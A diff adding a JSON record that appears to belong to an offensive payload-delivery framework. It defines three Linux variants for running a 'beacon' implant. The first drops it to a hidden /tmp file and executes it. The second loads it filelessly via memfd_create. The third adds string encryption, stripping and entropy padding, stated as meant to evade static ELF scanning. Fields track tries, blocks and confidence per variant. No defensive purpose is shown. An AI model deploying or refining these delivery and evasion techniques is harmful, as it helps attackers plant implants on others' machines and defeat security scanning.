@@ -1,0 +1,49 @@
+{
+  "id": "w006",
+  "name": "Linux ELF 投递（落盘 → 内存执行）",
+  "family": "payload/linux",
+  "match": {
+    "os": "linux",
+    "arch": "x64"
+  },
+  "variants": [
+    {
+      "vid": "v1",
+      "desc": "落盘 + chmod +x 直接执行（对照组）",
+      "command": "scp beacon /tmp/.b && chmod +x /tmp/.b && /tmp/.b",
+      "sig": ["elf-stub", "chmod-exec"],
+      "stack": [],
+      "platform": "linux",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v2",
+      "desc": "memfd_create + fexecve，磁盘零落地",
+      "command": "python3 -c 'import os;fd=os.memfd_create(\"\");os.write(fd,open(\"/dev/shm/.x\",\"rb\").read())' （实际用无文件加载器）",
+      "sig": [],
+      "stack": ["fileless.memfd"],
+      "platform": "linux",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v3",
+      "desc": "v2 + 字符串加密 + 段填充降熵（应对静态 ELF 扫描）",
+      "command": "strip --strip-all；字符串常量 AES 化；.text 尾部零填充至熵 6.4",
+      "sig": [],
+      "stack": ["fileless.memfd", "obf.string-enc", "ent.pad"],
+      "platform": "linux",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    }
+  ],
+  "evasion": {},
+  "attempts": [],
+  "derived": [],
+  "created_at": "2026-11-15T00:00:00Z",
+  "updated_at": "2026-11-15T00:00:00Z"
+}
